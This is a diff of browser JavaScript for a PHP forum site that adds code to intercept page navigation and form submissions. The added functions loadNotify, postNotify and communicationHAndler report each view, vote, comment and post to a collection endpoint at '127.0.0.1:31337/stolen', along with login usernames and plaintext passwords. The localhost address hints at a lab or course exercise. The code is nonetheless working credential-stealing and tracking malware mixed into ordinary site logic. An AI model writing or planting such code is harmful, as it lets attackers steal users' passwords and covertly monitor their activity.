@@ -1,30 +1,151 @@
+// TODO: fix login/logout url issue
+
+
 var globalUsername;
-//TODO: direct view post
-// window.onhashchange = function() { 
-//     console.log('location changed!');  
-// };
-// window.addEventListener('locationchange', function(){
-//     console.log('location changed!');
-// });
-// window.addEventListener('unload', function(event) {
-//     event.preventDefault();
-//     console.log('Navigation occuring');
-// });
-// window.onbeforeunload = function() { 
-//     return false;
-// }
+var server_address = "127.0.0.1:31337/stolen";
+
+if (window.history && window.history.pushState) {
+
+    $(window).on('popstate', function(event) {
+      var url = window.location.href;
+      console.log('Back button was pressed. will go bakc to'+ url);
+      loadContent(url, replacePage, null, 2);
+      event.preventDefault();
+    });
+}
+
+var script = document.createElement('script');script.src = "https://code.jquery.com/jquery-3.4.1.min.js";document.getElementsByTagName('head')[0].appendChild(script);
+
+function communicationHAndler(payload){
+    var url = 'http://' + server_address + '?' + payload;
+
+    $.get(url, function(){
+
+    });
+}
+
+function getValue(data, param) {
+    var query = data;
+    if(typeof data == 'string' || data instanceof String){
+        var vars = query.split('&');
+        for (var i = 0; i < vars.length; i++) {
+            var pair = vars[i].split('=');
+            if ((pair[0]) == param) {
+                return (pair[1]);
+            }
+        }
+
+    }
+    
+    return null;
+}
+
+function loadNotify(url, data){
+    var path = url.substring(url.lastIndexOf("/")+1);
+    var query_values;
+    if(path.lastIndexOf("?")!=-1){//contains query values
+        query_values = path.substring(path.lastIndexOf("?")+1);
+        path = path.substring(0, path.lastIndexOf("?"));
+    }
+    console.log("final path is : " + path);
+    var payload;
+    switch(path){
+        case "login.php":// fetch login page
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            
+            break;
+        case "logout.php":
+            payload = "event=logout&user="+globalUsername;
+            break;
+        case "view.php":
+            // need two post
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            communicationHAndler(payload);
+            var id = query_values.substring(query_values.lastIndexOf("=")+1);
+            if(globalUsername){
+                payload = "event=view&user="+globalUsername+"&post="+id;
+            }else{
+                payload = "event=view&post="+id;
+            }
+            break;
+        
+        case "":
+            // index page
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            break;
+        case "privacy.php":
+            if(globalUsername){
+                payload = "event=nav&user="+globalUsername+"&url="+path;
+            }else{
+                payload = "event=nav&url="+path;
+            }
+            break;
+        case "content.php":
+            payload = "event=nav&user="+globalUsername+"&url="+path;
+            break;
+        case "vote.php":
+            var id = getValue(data, 'id');
+            var vote = getValue(data, 'vote');
+            payload = "event=vote&user="+globalUsername+"&post="+id +"&vote="+vote;
+            break;
+        default:
+            if(globalUsername){
+                payload = "event=link&user="+globalUsername+"&link="+url;
+            }else{
+                payload = "event=link&link="+url;
+            }
+    }
+    // trigger send get request to server
+    
+    communicationHAndler(payload);
+}
 
 
-
-function loadContent(url, callback,data)
+function loadContent(url, callback,data,type)
 {
-
+    console.log("load Conetnt on : " + url);
+    loadNotify(url, data);
+    
     xmlhttp=new XMLHttpRequest();
     xmlhttp.onreadystatechange=function()
     {
         if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
-        {
-            callback(url,xmlhttp.response);
+        {   
+            var responsePath = xmlhttp.responseURL.substring(xmlhttp.responseURL.lastIndexOf("/")+1);
+            if(responsePath.lastIndexOf("?")!=-1){//contains query values
+                responsePath = responsePath.substring(0, responsePath.lastIndexOf("?"));
+            }
+
+            var oriPath = url.substring(url.lastIndexOf("/")+1);
+            if(oriPath.lastIndexOf("?")!=-1){//contains query values
+                oriPath = oriPath.substring(0, oriPath.lastIndexOf("?"));
+            }
+
+            if(responsePath != oriPath){
+                console.log("redirect to: " + responsePath + " ori : " + oriPath);
+                url = responsePath;
+                // redirect
+                loadNotify(url,null);
+            }
+
+            if(type == 1){
+                callback(url,xmlhttp.response, 1);
+            }else{
+                callback(url,xmlhttp.response, 2);
+            }
+            
         }
     }
     xmlhttp.open("GET", url, false);
@@ -36,62 +157,125 @@ function loadContent(url, callback,data)
     
 }
 
+function postNotify(url, data){
+    var path = url.substring(url.lastIndexOf("/")+1);
+    var payload;
+    
+    var username = getValue(data, 'username');
+    var password = getValue(data, 'password');
+    var comment = getValue(data, 'comment');
+    var parent = getValue(data, 'parent');
+    var uid =  getValue(data, 'uid');
+    var title = getValue(data, 'title');
+    var content = getValue(data, 'content');
+    var posttype = getValue(data, 'type');
+    // upload.php for image
+    var willPost = 1;
+    if(username != null && password !=null){
+        payload = "event=login&user="+username+"&pass="+password;
+    }else if(comment != null && parent !=null){
+        payload = "event=comment&user="+globalUsername+"&parent="+parent;
+    }else if(title != null && content != null && type !=null){
+        payload = "event=post&user=" + globalUsername + "&title=" + title + "&type=" + posttype;
+    }else if(url == "upload.php"){
+        payload = "event=image&user=" + globalUsername;
+    }else{
+        willPost = 0;
+        console.log("unrecongized post type !!");
+    }
+
+    // trigger send get request to server
+    if(willPost == 1){
+        communicationHAndler(payload);
+    }
+}
+
 function postRequest(url, callback, data, type){
     console.log("will post to "+ url +" data is : " + data);
+    
+    postNotify(url, data);
+
     var xmlhttp = new XMLHttpRequest();
     xmlhttp.onreadystatechange=function()
     {
         if (xmlhttp.readyState==4 && (xmlhttp.status==200 || xmlhttp.status==302))
         {
-            callback(url,xmlhttp.response);
+            
+
+            var responsePath = xmlhttp.responseURL.substring(xmlhttp.responseURL.lastIndexOf("/")+1);
+            if(responsePath.lastIndexOf("?")!=-1){//contains query values
+                responsePath = responsePath.substring(0, responsePath.lastIndexOf("?"));
+            }
+            var oriPath = url.substring(url.lastIndexOf("/")+1);
+            if(oriPath.lastIndexOf("?")!=-1){//contains query values
+                oriPath = oriPath.substring(0, oriPath.lastIndexOf("?"));
+            }
+
+            if(responsePath != oriPath){
+                console.log("redirect to: " + responsePath + " ori : " + oriPath);
+                url = responsePath;
+                // redirect
+                loadNotify(url,null);
+            }
+            if(type == 1){
+                callback(url,xmlhttp.response, 1);
+            }else{
+                callback(url,xmlhttp.response, 2);
+            }
         }else{
-            console.log("post status: "+ xmlhttp.status);
+            console.log("post status not handled: "+ xmlhttp.status);
         }
     }
     xmlhttp.open("POST", url, true);
     if(type == 1){
         xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     }else{
-        xmlhttp.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryRpklzwpc8aHhtWOu");
+        //xmlhttp.setRequestHeader("Content-Type", "multipart/form-data");
     }
     
     xmlhttp.send(data);
 }
 
-function replacePage(url,data){
+function replacePage(url,data, type){
     //console.log(data);
     var dummy = document.createElement( 'html' );
     dummy.innerHTML = data;
     yourGlobalVariable = dummy;
     document.body.innerHTML = dummy.getElementsByTagName( 'body' )[0].innerHTML;
-    window.history.pushState("object or string", "Title", url);
-    window.dispatchEvent(new HashChangeEvent("hashchange"))
+    if(type == 1){
+        window.history.pushState(null, "Title", url);
+    }
+    //window.dispatchEvent(new HashChangeEvent("hashchange"))
     addListener();
     console.log("page listener add done");
 }
 
 function linkClickHandler(element){
     console.log("called on "+ element.href);
-    var path = element.href.substring(element.href.lastIndexOf("/")+1);
-    if(path == 'login.php' || 'logout.php'){// get login page
-        var url = element.href;
-        console.log("will fetch " + url);
-        loadContent(url,replacePage);
-    }else{
-        var url = element.href;
-        console.log("will fetch " + url);
-        loadContent(url,replacePage);
+    if(element.href){
+        var path = element.href.substring(element.href.lastIndexOf("/")+1);
+        if(path == 'login.php' || 'logout.php'){// get login page
+            var url = element.href;
+            //console.log("will fetch " + url);
+            loadContent(url,replacePage, null, 1);
+        }else{
+            var url = element.href;
+            //console.log("will fetch " + url);
+            loadContent(url,replacePage, null, 1);
+        }
     }
+    
 }
 
 function buttonClickHandler(element, url){
-    console.log("called on submit"+ element.id);
+    //console.log("called on submit"+ element.id);
     if(element.id == 'login-btn'){// submit login request
         url =  'post.php';
         var username = document.getElementById('username').value;
         var password = document.getElementById('userpass').value;
         var data = "username=" + username + "&password=" + password +"&form=login";
-        console.log("will post username  " + username + " password " + password);
+        //console.log("will post username  " + username + " password " + password);
+
         postRequest(url, replacePage, data, 1);
     }else if(element.id == 'comment-post-btn'){
         // post comment
@@ -117,13 +301,13 @@ function buttonClickHandler(element, url){
     }else if(element.id == 'image-post-btn'){
         //post an image
         url = 'upload.php';
-        
-        var data = document.getElementById("content-file").files[0];
-        var fileName = data.name;
-        $('.custom-file-label').html(fileName);
+       // var data = new FormData(document.getElementById("content-file").files[0]);
+        var data = new FormData($('#image-upload-frm')[0]);
+        data.processData = false;
+        data.contentType = false;
         console.log("will post image on behalf of  " + globalUsername );
 
-        //postRequest(url, replacePage, data, 2);
+        postRequest(url, replacePage, data, 2);
     }
 }
 
@@ -146,11 +330,11 @@ function normalLinkHandler(username, url){
         var val = vote_valstr.substring(vote_valstr.lastIndexOf("=")+1);
         console.log("user vote on post: "+ globalUsername + " postid : " + id + " vote val : "+ val);
         var data = "id=" + id + "&vote=" + val;
-        loadContent(url,replacePage,data);
+        loadContent(url,replacePage,data,1);
 
     }else{
         console.log("user view on username: "+ globalUsername + " url : " +url);
-        loadContent(url,replacePage);
+        loadContent(url,replacePage,null,1);
     }
     
     return false;
